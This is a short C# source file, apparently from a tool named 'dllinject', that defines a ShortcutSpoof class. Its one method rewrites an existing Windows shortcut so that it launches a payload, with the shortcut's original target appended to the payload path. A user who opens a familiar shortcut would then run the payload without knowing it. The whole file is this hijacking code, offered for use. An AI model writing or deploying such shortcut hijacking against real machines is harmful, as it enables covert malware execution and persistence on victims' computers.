using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using IWshRuntimeLibrary;
using Shell32;

namespace dllinject
{
    public class ShortcutSpoof
    {
        public void changeShortcut(string shortcutLink, string executePayloadLink) {

            WshShell shell = new WshShell();
            IWshShortcut link = shell.CreateShortcut(shortcutLink);
            string originalTarget = link.TargetPath;
            
            //set original target as argument for payload
            link.TargetPath = executePayloadLink + originalTarget;

            link.Save();
        }



    }
}
